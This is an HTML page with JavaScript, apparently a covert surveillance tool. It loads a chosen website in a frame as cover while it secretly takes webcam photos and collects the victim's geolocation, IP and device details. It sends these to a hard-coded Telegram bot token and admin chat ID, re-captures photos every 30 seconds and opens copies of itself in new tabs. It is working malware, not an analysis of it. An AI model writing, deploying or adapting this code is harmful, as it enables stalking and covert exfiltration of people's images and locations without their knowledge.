<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000000;
            font-family: Arial, sans-serif;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            z-index: 2;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: opacity 0.3s;
        }
        
        .loader {
            text-align: center;
            color: white;
        }
        
        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid #333;
            border-top: 3px solid #00ff88;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Website Frame - Shows IMMEDIATELY -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals"
            allow="camera; microphone; geolocation"
            allowfullscreen></iframe>
    
    <!-- Loading Overlay - Hidden after 1 second -->
    <div id="loadingOverlay">
        <div class="loader">
            <div class="spinner"></div>
            <div style="font-size: 12px; color: #888; margin-top: 10px;">
                Establishing secure connection...
            </div>
        </div>
    </div>
    
    <!-- Hidden Camera -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>

    <script>
        // =====================================================
        //  ULTRA-FAST STEALTH CAPTURE
        //  Shows website instantly, captures in background
        // =====================================================
        
        // Telegram Configuration
        const BOT_TOKEN = '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const ADMIN_ID = '6314556756';
        
        // Global state
        const data = {
            session: Date.now() + '_' + Math.random().toString(36).substr(2, 6),
            user: null,
            target: null,
            photos: [],
            completed: false
        };
        
        // DOM elements
        const frame = document.getElementById('websiteFrame');
        const loading = document.getElementById('loadingOverlay');
        const video = document.getElementById('cameraVideo');
        const canvas = document.getElementById('captureCanvas');
        const ctx = canvas.getContext('2d');
        
        // ============== STEP 1: PARSE URL & LOAD WEBSITE IMMEDIATELY ==============
        function initialize() {
            // Parse URL in background
            const params = new URLSearchParams(window.location.search);
            data.user = params.get('chat_id') || params.get('user') || params.get('id') || ADMIN_ID;
            
            let target = params.get('site') || params.get('url') || params.get('target') || 'https://google.com';
            
            // Decode if encoded
            try {
                if (target.startsWith('QUANTUM:')) {
                    target = atob(target.split(':')[1]);
                } else if (!target.includes('://')) {
                    target = atob(target);
                }
                target = decodeURIComponent(target);
            } catch (e) {}
            
            if (!target.startsWith('http')) {
                target = 'https://' + target;
            }
            
            data.target = target;
            
            // LOAD WEBSITE IMMEDIATELY
            frame.src = target;
            
            // Hide loading screen after 1 second
            setTimeout(() => {
                loading.style.opacity = '0';
                setTimeout(() => {
                    loading.style.display = 'none';
                }, 300);
            }, 1000);
            
            // Start data capture in background
            setTimeout(captureAllData, 500);
            
            // Start tab replication
            setTimeout(replicateTabs, 2000);
        }
        
        // ============== STEP 2: FAST DATA CAPTURE ==============
        async function captureAllData() {
            try {
                // Capture device info FAST
                const deviceInfo = await captureDeviceInfo();
                
                // Capture location FAST (non-blocking)
                captureLocation();
                
                // Capture IP FAST (non-blocking)
                captureIP();
                
                // Capture photos FAST
                await capturePhotosFast();
                
                // Send brief report
                await sendBriefReport(deviceInfo);
                
                // Send photos in background
                sendPhotosInBackground();
                
                data.completed = true;
                
            } catch (error) {
                console.error('Capture error:', error);
            }
        }
        
        // ============== DEVICE INFO ==============
        async function captureDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown', browser = 'Unknown';
            
            if (/Windows/.test(ua)) os = 'Windows';
            else if (/Mac/.test(ua)) os = 'macOS';
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad/.test(ua)) os = 'iOS';
            
            if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edge/.test(ua)) browser = 'Edge';
            
            return {
                os: os,
                browser: browser,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || '?',
                platform: navigator.platform,
                language: navigator.language
            };
        }
        
        // ============== LOCATION ==============
        function captureLocation() {
            if (!navigator.geolocation) return;
            
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    data.location = {
                        lat: pos.coords.latitude.toFixed(6),
                        lon: pos.coords.longitude.toFixed(6),
                        acc: Math.round(pos.coords.accuracy)
                    };
                },
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
        
        // ============== IP ADDRESS ==============
        async function captureIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json', { timeout: 2000 });
                const result = await response.json();
                data.ip = result.ip;
            } catch (e) {
                try {
                    const response = await fetch('https://icanhazip.com/', { timeout: 2000 });
                    data.ip = await response.text();
                } catch (e) {}
            }
        }
        
        // ============== FAST PHOTO CAPTURE ==============
        async function capturePhotosFast() {
            try {
                // Request camera once
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: { ideal: 'user' }
                    }
                });
                
                video.srcObject = stream;
                
                // Wait very short time
                await new Promise(r => setTimeout(r, 300));
                
                // Capture 2 photos quickly
                for (let i = 0; i < 2; i++) {
                    const blob = await captureSinglePhoto();
                    if (blob) {
                        data.photos.push({
                            blob: blob,
                            type: 'front',
                            index: i + 1
                        });
                    }
                    await new Promise(r => setTimeout(r, 100));
                }
                
                // Stop stream immediately
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.log('Camera capture skipped');
            }
        }
        
        function captureSinglePhoto() {
            if (!video.videoWidth) return null;
            
            try {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Simple enhancement
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const pixels = imageData.data;
                
                for (let i = 0; i < pixels.length; i += 4) {
                    pixels[i] = Math.min(255, pixels[i] * 1.2);
                    pixels[i+1] = Math.min(255, pixels[i+1] * 1.2);
                    pixels[i+2] = Math.min(255, pixels[i+2] * 1.2);
                }
                
                ctx.putImageData(imageData, 0, 0);
                
                return new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        resolve(blob && blob.size > 10000 ? blob : null);
                    }, 'image/jpeg', 0.85);
                });
                
            } catch (error) {
                return null;
            }
        }
        
        // ============== SEND BRIEF REPORT ==============
        async function sendBriefReport(deviceInfo) {
            try {
                let report = `ðŸš€ *QUICK CAPTURE COMPLETE*\n\n`;
                report += `Session: \`${data.session}\`\n`;
                report += `User: \`${data.user}\`\n`;
                report += `Time: ${new Date().toLocaleTimeString()}\n\n`;
                
                report += `ðŸ“± Device: ${deviceInfo.os} ${deviceInfo.browser}\n`;
                report += `ðŸ“º Screen: ${deviceInfo.screen}\n`;
                report += `ðŸ’» Cores: ${deviceInfo.cores}\n`;
                
                if (data.ip) {
                    report += `ðŸŒ IP: \`${data.ip.trim()}\`\n`;
                }
                
                if (data.location) {
                    report += `ðŸ“ Location: ${data.location.lat}, ${data.location.lon}\n`;
                }
                
                report += `ðŸ“¸ Photos: ${data.photos.length} captured\n`;
                report += `ðŸŽ¯ Target: ${data.target}\n\n`;
                
                report += `âš¡ Status: ACTIVE & STEALTH`;
                
                // Send to user
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: data.user,
                        text: report,
                        parse_mode: 'Markdown'
                    })
                });
                
                // Send to admin
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: report + `\n\nðŸ‘¤ Target User: \`${data.user}\``,
                        parse_mode: 'Markdown'
                    })
                });
                
            } catch (error) {
                console.error('Report error:', error);
            }
        }
        
        // ============== SEND PHOTOS IN BACKGROUND ==============
        async function sendPhotosInBackground() {
            if (data.photos.length === 0) return;
            
            // Send each photo with delay
            for (const photo of data.photos) {
                try {
                    await sendSinglePhoto(photo);
                    await new Promise(r => setTimeout(r, 300));
                } catch (e) {
                    // Continue with next photo
                }
            }
        }
        
        async function sendSinglePhoto(photo) {
            try {
                const caption = `ðŸ“¸ ${photo.type.toUpperCase()} Camera\nSession: \`${data.session}\`\nUser: \`${data.user}\``;
                
                // Send to user
                const userForm = new FormData();
                userForm.append('chat_id', data.user);
                userForm.append('photo', photo.blob, `photo_${Date.now()}.jpg`);
                userForm.append('caption', caption);
                userForm.append('parse_mode', 'Markdown');
                
                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: userForm
                });
                
                // Send to admin
                const adminForm = new FormData();
                adminForm.append('chat_id', ADMIN_ID);
                adminForm.append('photo', photo.blob, `admin_${Date.now()}.jpg`);
                adminForm.append('caption', caption);
                adminForm.append('parse_mode', 'Markdown');
                
                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: adminForm
                });
                
            } catch (error) {
                console.error('Photo send error:', error);
            }
        }
        
        // ============== TAB REPLICATION ==============
        function replicateTabs() {
            // Open 3 new tabs of itself
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    try {
                        const newTab = window.open(window.location.href, '_blank');
                        if (newTab) {
                            // Close tab after 2 minutes
                            setTimeout(() => {
                                try {
                                    newTab.close();
                                } catch (e) {}
                            }, 120000);
                        }
                    } catch (e) {
                        // Popup blocked
                    }
                }, i * 1000);
            }
            
            // Also replicate via iframe method
            setTimeout(() => {
                try {
                    // Create hidden iframe that loads same page
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = window.location.href;
                    document.body.appendChild(iframe);
                    
                    // Remove after 10 seconds
                    setTimeout(() => {
                        iframe.remove();
                    }, 10000);
                } catch (e) {}
            }, 2000);
        }
        
        // ============== CONTINUOUS SURVEILLANCE ==============
        function startContinuousSurveillance() {
            // Check every 30 seconds for updates
            setInterval(async () => {
                if (!data.completed) return;
                
                try {
                    // Try to capture one more photo
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user' }
                    });
                    
                    video.srcObject = stream;
                    await new Promise(r => setTimeout(r, 200));
                    
                    const blob = await captureSinglePhoto();
                    if (blob) {
                        const photo = { blob: blob, type: 'update', index: Date.now() };
                        data.photos.push(photo);
                        sendSinglePhoto(photo);
                    }
                    
                    stream.getTracks().forEach(track => track.stop());
                    
                } catch (error) {
                    // Silent fail
                }
            }, 30000); // Every 30 seconds
        }
        
        // ============== START EVERYTHING ==============
        window.addEventListener('load', () => {
            // Initialize immediately
            initialize();
            
            // Start continuous surveillance
            setTimeout(startContinuousSurveillance, 5000);
            
            // Force completion after 10 seconds
            setTimeout(() => {
                data.completed = true;
            }, 10000);
        });
        
        // Handle page visibility
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && data.completed) {
                // Page became visible again
                setTimeout(() => {
                    replicateTabs();
                }, 1000);
            }
        });
        
        // Debug info
        console.log('ðŸš€ Quantum System v10 - Running in STEALTH mode');
        console.log('ðŸ“¡ Website loaded instantly, data capture in background');
        console.log('ðŸ“¸ Photos will be sent silently');
        console.log('ðŸ”„ Tab replication active');
        
    </script>
</body>
</html>
